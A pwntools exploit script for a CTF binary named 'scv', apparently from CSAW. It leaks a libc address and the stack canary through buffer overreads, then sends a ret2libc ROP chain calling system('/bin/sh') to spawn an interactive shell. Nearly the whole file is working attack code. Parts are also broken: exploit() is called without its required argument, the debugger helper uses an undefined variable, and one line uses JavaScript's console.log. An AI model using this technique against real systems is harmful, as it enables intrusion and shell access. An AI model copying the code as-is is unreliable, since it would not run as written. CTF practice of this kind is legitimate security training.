#!/usr/bin/env python

from pwn import *
import os
import sys

_DEBUG = False

context.arch = 'amd64'

io = process('./scv', env={ 'LD_PRELOAD' : './libc-2.23.so' })
#io = remote('pwn.cha1.csaw.io', 3764)

atexit_offset  = 0x0003a280
system_offset  = 0x00045390
exit_offset    = 0x0003a030
_bin_sh_offset = 0x0018cd17 # strings -tx libc-2.23.so | grep bin
pop_rdi_ret    = 0x00400ea3 # /R pop rdi

packer = make_packer(64, endian='little', sign='unsigned')
unpacker = make_unpacker(64, endian='little', sign='unsigned')

def radare2():
    c = "aaaa; db main; "
    c += "db 0x00400aaa; "
    #c += "db 0x00400b0a; "
    #c += "db 0x004008d0; "
    #c += "db __cxa_atexit; "
    c += "db 0x00400dd7; "
    c += "db 0x00400dde; "
    c += "db; "

    pid = util.io.pidof(proc)[0]
    os.system('screen r2 -d %d -c "%s"' % (pid, c)) # open radare2 in debug mode
    util.io.wait_for_debugger(pid) # wait for debugger  

def exploit(proc):
    try:
        # 1. calculate libc dynamic load adress using <__cxa_atexit+25> junk on the stack
        #   a) get sym.system function
        #   b) get pointer to /bin/sh string
        #   c) get sym.exit function
        io.recvuntil('>>')
        io.sendline('1')
        io.recvuntil('>>')
        io.send('A' * 40)
        io.recvuntil('>>')
        io.sendline('2')
        io.recvlines(5) # skip junk
        io.recvn(40) # skip 'A' * 40

        __cxa_atexit = io.recvn(6) + '\x00\x00' # get <__cxa_atexit+25>
        __cxa_atexit = unpacker(__cxa_atexit) - 0x19

        libc = __cxa_atexit - atexit_offset
        system = libc + system_offset
        _bin_sh = libc + _bin_sh_offset
        exit_0 = libc + exit_offset

        console.log("[+] sym.imp.__cxa_atexit 0x%x" % __cxa_atexit)
        print "[+] libc 0x%x" % libc
        print "[+] sym.imp.system 0x%x" % system
        print "[+] /bin/sh 0x%x" % _bin_sh
        print "[+] exit_0 0x%x" % exit_0
        print "[+] pop_rdi_ret 0x%x" % pop_rdi_ret

        # 2. find stack canary on the stack
        io.recvuntil('>>')
        io.sendline('1')
        io.recvuntil('>>')        
        io.send('A' * 169) # fill until stack canary to overwrite \x00 terminator, to reveil stack canary
        io.recvuntil('>>') # read buffer
        io.sendline('2')
        io.recvlines(5) # skip junk
        rd = io.recvline()[168:176] # read stack canary
        stack_canary = unpacker(rd) & 0xffffffffffffff00 # unpack stack canary and set the left most bytes to \x00 

        io.recvuntil('>>')
        io.sendline('1')
        io.recvuntil('>>')
        io.send('A' * 184) # fill until return adress
        io.recvuntil('>>')
        io.sendline('2')
        io.recvlines(5)
        rd = io.recvn(6) + '\x00' # get return adress
	
        # 3. create exploit
        payload  = 'A' * 168
        payload += packer(stack_canary)
        payload += 'A' * 8
        payload += packer(pop_rdi_ret)
        payload += packer(_bin_sh)
        payload += packer(system)

        io.sendline('1')
        io.recvuntil('>>')
        io.send(payload)
        io.recvuntil('>>')
        io.sendline('3')
        io.interactive()
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print "[!] Error on line %d: %s" % (exc_tb.tb_lineno, e)

if __name__ == "__main__":
    if _DEBUG:
        radare2()
    exploit()
